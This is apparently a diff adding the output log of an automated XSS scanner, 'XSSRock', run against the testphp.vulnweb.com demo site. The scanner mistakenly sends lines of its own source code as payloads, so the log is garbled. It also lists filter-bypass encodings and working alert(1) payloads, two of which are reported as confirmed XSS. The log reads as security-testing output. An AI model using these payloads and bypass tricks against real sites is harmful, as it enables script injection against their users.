@@ -1,0 +1,68 @@
+
+==================================================
+🔥 XSSRock - Automated XSS Scanner 🔥
+Created by RockSec | Advanced XSS Detection Suite
+==================================================
+    
+
+🚀 [STARTING SCAN] http://testphp.vulnweb.com/search.php?test=12
+--------------------------------------------------
+
+📌 [PARAMETER] Testing parameter: test
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+argparse with payload: import argparse
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+requests with payload: import requests
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+threading with payload: import threading
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+queue with payload: import queue
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+random with payload: import random
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+time with payload: import time
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+json with payload: import json
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+base64 with payload: import base64
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+os with payload: import os
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=import+re with payload: import re
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=from+selenium+import+webdriver with payload: from selenium import webdriver
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=from+selenium.webdriver.chrome.options+import+Options with payload: from selenium.webdriver.chrome.options import Options
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=from+urllib.parse+import+urlparse%2C+parse_qs%2C+urlencode with payload: from urllib.parse import urlparse, parse_qs, urlencode
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%23+Banner with payload: # Banner
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=def+print_banner%28%29%3A with payload: def print_banner():
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=banner+%3D+%22%22%22 with payload: banner = """
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D with payload: ==================================================
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%F0%9F%94%A5+XSSRock+-+Automated+XSS+Scanner+%F0%9F%94%A5 with payload: 🔥 XSSRock - Automated XSS Scanner 🔥
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=Created+by+RockSec+%7C+Advanced+XSS+Detection+Suite with payload: Created by RockSec | Advanced XSS Detection Suite
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D with payload: ==================================================
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22%22%22 with payload: """
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=print%28banner%29 with payload: print(banner)
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%23+XSS+Payloads+%26+Bypass+Techniques with payload: # XSS Payloads & Bypass Techniques
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=bypass_techniques+%3D+%5B with payload: bypass_techniques = [
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+base64.b64encode%28p.encode%28%29%29.decode%28%29%2C++%23+Base64+Encoding with payload: lambda p: base64.b64encode(p.encode()).decode(),  # Base64 Encoding
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+%27%27.join%28f%27%26%23%7Bord%28c%29%7D%3B%27+for+c+in+p%29%2C++%23+HTML+Entity+Encoding with payload: lambda p: ''.join(f'&#{ord(c)};' for c in p),  # HTML Entity Encoding
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+p.replace%28%27%3C%27%2C+%27%26lt%3B%27%29.replace%28%27%3E%27%2C+%27%26gt%3B%27%29%2C++%23+Escaping with payload: lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),  # Escaping
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+p.replace%28%27alert%27%2C+%27a%5C%5Clert%27%29%2C++%23+JavaScript+Obfuscation with payload: lambda p: p.replace('alert', 'a\\lert'),  # JavaScript Obfuscation
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%3C%21--%7Bp%7D--%3E%27%2C++%23+HTML+Comment+Injection with payload: lambda p: f'<!--{p}-->',  # HTML Comment Injection
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%2F%2A%2A%2F%7Bp%7D%2F%2A%2A%2F%27%2C++%23+CSS%2FJavaScript+Comment+Obfuscation with payload: lambda p: f'/**/{p}/**/',  # CSS/JavaScript Comment Obfuscation
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%22%3B%7Bp%7D%3B%22%27%2C++%23+String+Injection with payload: lambda p: f'";{p};"',  # String Injection
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%3Cscr%3Cscript%3Eipt%3E%7Bp%7D%3C%2Fscr%3Cscript%3Eipt%3E%27%2C++%23+HTML+Tag+Break with payload: lambda p: f'<scr<script>ipt>{p}</scr<script>ipt>',  # HTML Tag Break
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%3Csvg%2Fonload%3D%22%7Bp%7D%22%3E%27%2C++%23+SVG+Injection with payload: lambda p: f'<svg/onload="{p}">',  # SVG Injection
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%3Cimg+src%3Dx+onerror%3D%22%7Bp%7D%22%3E%27%2C++%23+Attribute-Based+XSS with payload: lambda p: f'<img src=x onerror="{p}">',  # Attribute-Based XSS
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=lambda+p%3A+f%27%60%7Bp%7D%60%27%2C++%23+Template+Literals+XSS with payload: lambda p: f'`{p}`',  # Template Literals XSS
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%5D with payload: ]
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=default_payloads+%3D+%5B with payload: default_payloads = [
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%2C with payload: "<script>alert(1)</script>",
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%2C with payload: '"><script>alert(1)</script>',
+[92m[✅] XSS Found! http://testphp.vulnweb.com/search.php?test=%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%2C[0m
+📢 [NOTIFIED] Slack notification sent successfully.
+[92m[✅] XSS Confirmed on test with payload: '"><script>alert(1)</script>',[0m
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22%27%3Balert%281%29%2F%2F%22%2C with payload: "';alert(1)//",
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22%3Csvg%2Fonload%3Dalert%281%29%3E%22%2C with payload: "<svg/onload=alert(1)>",
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22javascript%3Aalert%281%29%22%2C with payload: "javascript:alert(1)",
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%2C with payload: '"><img src=x onerror=alert(1)>',
+[92m[✅] XSS Found! http://testphp.vulnweb.com/search.php?test=%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%2C[0m
+📢 [NOTIFIED] Slack notification sent successfully.
+[92m[✅] XSS Confirmed on test with payload: '"><img src=x onerror=alert(1)>',[0m
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%27%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E%27%2C with payload: '<iframe src="javascript:alert(1)"></iframe>',
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22document.write%28%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%29%3B%22%2C with payload: "document.write('<script>alert(1)</script>');",
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%22%3Cbody+onload%3Dalert%281%29%3E%22%2C with payload: "<body onload=alert(1)>",
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%5D with payload: ]
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=%23+Load+proxies+from+file with payload: # Load proxies from file
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=def+load_proxies%28proxy_file%29%3A with payload: def load_proxies(proxy_file):
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=proxies+%3D+%5B%5D with payload: proxies = []
+🔍 [TESTING] http://testphp.vulnweb.com/search.php?test=if+proxy_file+and+os.path.exists%28proxy_file%29%3A with payload: if proxy_file and os.path.exists(proxy_file):
